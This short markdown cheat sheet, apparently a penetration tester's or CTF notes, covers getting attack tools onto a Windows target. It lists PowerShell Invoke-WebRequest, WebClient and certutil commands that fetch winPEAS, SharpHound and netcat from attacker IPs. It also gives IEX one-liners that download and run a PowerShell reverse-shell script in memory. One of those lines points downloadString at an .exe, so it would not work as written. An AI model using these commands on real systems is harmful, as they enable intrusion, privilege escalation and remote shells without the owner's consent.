
## powershell

```powershell
powershell Invoke-WebRequest -Uri "http://10.10.14.7/winPEASany.exe" -OutFile "winPEASany.exe" 
```
```sh
powershell Invoke-WebRequest -Uri "http://10.10.14.48/SharpHound.exe" -OutFile "SharpHound.exe" 
```

`upload via web`
```powershell
powershell (new-object System.Net.WebClient).Downloadfile('http://192.168.1.36/nc.exe', 'nc.exe')
```


`download and execute a script`

```pwsh
powershell IEX(New-Object Net.WebClient).downloadString(\"http://192.168.1.36/ncat.exe\")
```

```pwsh
iex (iwr '10.10.14.3/Invoke-PowerShellTcp.ps1' -UseBasicParsing)
```


## certutil.exe

```powershell
certutil.exe -urlcache -split -f "http://10.10.14.7/winPEASany.exe" winpeas.exe
```
